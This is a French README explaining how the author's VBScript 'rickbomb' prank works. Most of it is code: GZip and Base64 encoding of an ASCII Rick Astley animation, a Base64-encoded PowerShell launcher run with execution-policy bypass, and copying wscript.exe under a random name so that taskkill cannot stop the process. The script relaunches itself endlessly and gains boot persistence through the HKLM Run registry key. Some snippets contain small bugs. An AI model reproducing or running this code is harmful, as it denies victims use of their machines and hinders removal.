# Précisions sur le script

J'ai fait le script en format VBScript. Il s'agit d'un fichier à l'extension .vbs et son interpréteur est wscript.exe. J'ai choisi cet interpréteur car contrairement à PowerShell ou Batch, on peut le lancer en arrière-plan sans démarrer une fenêtre de console. 

En ouvrant le fichier VBS, on remarque variables qui contiennent d'étranges chaînes de caractères.


## L'animation de Rick Astley

La variable **a** dans le script est un gros bloc de texte encodé en [Base64](https://fr.wikipedia.org/wiki/Base64). C'est un format utilisé pour représenter des données binaires, non textuelles, en utilisant seulement des caractères textuels. 

Pour construire ce bloc, j'ai créé un fichier avec toutes les trames de l'animation (voir le fichier `rickanim.txt`). J'ai mis un caractère `#` à la fin de chaque trame. Comme ça donne un fichier assez gros, j'ai cru bon compresser la chaîne avec GZip, un algorithme particulièrement efficace sur les chaînes de caractères. Je l'ai fait en appelant des méthodes .NET en PowerShell.

En partant de l'animation en texte brut, `rickanim.txt`, j'ai généré une chaîne compressée, que j'ai enregistré dans le fichier `r.txt`.

```powershell
# L'animation est stockée dans un fichier texte. On stocke le contenu dans une variable.
$String = Get-Content ".\rickanim.txt" -Raw

# On va chercher les octets de la chaîne de caractères.
$Bytes = [System.Text.Encoding]::UTF8.GetBytes($String)

# Ces octets sont compressés en utilisant Gzip.
[System.IO.MemoryStream] $OutputStream = New-Object System.IO.MemoryStream
$GzipStream = New-Object System.IO.Compression.GzipStream $OutputStream, ([IO.Compression.CompressionMode]::Compress)
$GzipStream.Write($Bytes, 0, $Bytes.Count)
$GzipStream.Close()
$OutputStream.Close()
$CompressedBytes = $OutputStream.ToArray()

# On convertit les octets compressés en BASE64
$CompressedString = [Convert]::toBase64String($CompressedBytes)

# On écrit le résultat dans un fichier texte.
$CompressedString | Set-Content ".\r.txt" -Encoding utf8
```

Il suffit ensuite de copier ce texte dans le script en le brisant avec plusieurs lignes (en VBScript, le caractère `&` sert à concaténer deux chaînes, et le caractère `_` sert à étendre une seule ligne de code sur plusieurs lignes de texte. )

Pour décompresser, il suffit de faire l'opération inverse:

```powershell
# On stocke le contenu du fichier texte compressé en BASE64 dans une variable.
$CompressedString = Get-Content ".\r.txt" -Raw

# On décompresse avec Gzip.
$InputStream = New-Object System.IO.MemoryStream(,[Convert]::FromBase64String($CompressedString))
$OutputStream = New-Object System.IO.MemoryStream
$GzipStream = New-Object System.IO.Compression.GzipStream $InputStream,([IO.Compression.CompressionMode]::Decompress)
$GzipStream.CopyTo($OutputStream)
$GzipStream.Close()
$OutputStream.Close()
$InputStream.Close()
$Bytes = $OutputStream.ToArray()

# On restitue une chaîne de caractères à partir des octets.
$String = [System.Text.Encoding]::utf8.GetString()

# On écrit le résultat dans un fichier texte.
$String | Set-Content ".\r_decoded.txt" -Encoding utf8
```

## Le script PowerShell

La variable **b** contient aussi une chaîne encodée en BASE64. Contrairement à l'animation de Rick, cette chaîne n'est pas compressée. On extrait simplement les octets en format Unicode [UTF-16LE](https://en.wikipedia.org/wiki/UTF-16) puis on les convertit en BASE64. Ce script obtient la chaîne à partir du fichier `r.txt`.

```powershell
# On stocke le script PowerShell à encoder dans une variable.
$script = [scriptblock]{
    $foo = Get-Content "$env:temp\r.txt" -Raw
    $bar = New-Object System.IO.MemoryStream(,[Convert]::FromBase64String($foo))
    $baz = New-Object System.IO.MemoryStream
    $qux = New-Object System.IO.Compression.GzipStream $bar,([IO.Compression.CompressionMode]::Decompress)
    $qux.CopyTo($baz) ; $qux.Close() ; $baz.Close() ; $bar.Close()
    $quux = [System.Text.Encoding]::utf8.GetString($baz.ToArray())
    while($true){ $quux.split('#') | ForEach-Object{Clear-Host;$_;Start-Sleep -Milliseconds 50} }
}

# On convertit le script en chaîne de caractères et on en extrait les octets UTF16-LE.
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script.ToString())

# On encode ces octets en BASE64.
$encodedCommand = [Convert]::ToBase64String($bytes)

# Puis on écrit la chaîne résultante dans un fichier.
$String | Set-Content ".\encoded_script.txt" -Encoding utf8
```

L'interpréteur PowerShell permet de charger un script encodé en UTF-16LE directement en le passant en argument.

```powershell
powershell.exe -EncodedCommand $encodedCommand
```

Pour décoder le script PowerShell, on n'a qu'à faire l'opération inverse.

```powershell
$encodedString = Get-Content .\encoded_script.txt -Raw
$decodedBytes = [Convert]::fromBase64String($encodedString)   
[System.Text.Encoding]::Unicode.GetString($decodedBytes)
```

## La bombe

Avec ces deux chaînes encodées, le script est en mesure de lancer une fenêtre PowerShell avec l'animation de Rick Astley. Mais ce n'est pas la partie la plus dangereuse. Le mécanisme qui permet au script de démarrer en boucle est déterminé par le code VBScript.

Premièrement, le script doit initialiser des objets pour manipuler le *shell* et le système de fichiers.
```vb
set c = CreateObject("Scripting.FileSystemObject")
set d = CreateObject("WScript.Shell")
```

Ensuite, le script fait une copie de l'interpréteur `wscript.exe` dans le répertoire temporaire de l'utilisateur (`C:\Users\nomdelutilisateur\Appdata\Local\Temp\`) sous un nom de fichier généré aléatoirement. Cela évite de pouvoir mettre fin au virus avec une simple commande `taskkill /f /im wscript.exe`.
```vb
e = "c:\windows\system32\wscript.exe"
f = d.ExpandEnvironmentStrings("%tmp%") & "\" & c.GetTempName & ".exe"
c.CopyFile e, f, true
```

Il faut aussi écrire le contenu de la chaîne encodée de Rick dans un fichier texte de façon à ce que le script PowerShell qui démarrera par la suite puisse avoir accès aux données compressées. La chaîne est trop grande pour la passer directement dans la commande encodée, alors ça nous force à utiliser un fichier. On dépose le fichier dans le répertoire temporaire de l'utilisateur (`C:\Users\nomdelutilisateur\Appdata\Local\Temp\`).
```vb
g = d.ExpandEnvironmentStrings("%tmp%") & "\r.txt"
if not c.FileExists(g) then
    set h = c.CreateTextFile(g,True)
    h.Write a & vbCrLf
end if
```

On lance le script PowerShell encodé dans la variable `b` en parallèle.
```vb
d.run "powershell.exe -executionpolicy bypass -noexit -encodedcommand " & b, 1, False
```

Finalement, on exécute la copie de l'interpréteur wscript avec son nom aléatoire pour qu'il exécute le script
```vb
d.run f & " " & WScript.ScriptFullName,0,False
```

## Lancement de la bombe

Pour démarrer la bombe, il suffit d'exécuter le fichier `rickbomb.vbs` par l'interpréteur `wscript.exe` se trouvant dans `C:\Windows\System32\`. 

```bat
wscript.exe /b /nologo %windir%\rickbomb.vbs
```

## Lancement automatique

Pour que le script soit lancé automatiquement au démarrage d'une session utilisateur, on peut planifier son exécution de plusieurs manières. J'ai choisi de le déposer dans la clé *Run* du registre.

```powershell
# On copie le script dans C:\Windows\
$CopyFileSplat = @{
    Path = "$PSScriptRoot\rickbomb.vbs"
    Destination = "C:\Windows"
}
Copy-Item @CopyFileSplat -Force

# On crée l'entrée au registre pour le démarrage automatique
$RegValSplat = @{
    Path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    Name = "rickbomb"
    PropertyType = "ExpandString"
    Value = "%windir%\system32\wscript.exe /b /nologo %windir%\rickbomb.vbs"
}
New-ItemProperty @RegValSplat -Force
```


## Références

L'animation de Rick Astley a été empruntée de cette page: https://www.ascii.co.uk/animated-art/rickroll-animated-ascii-art.html
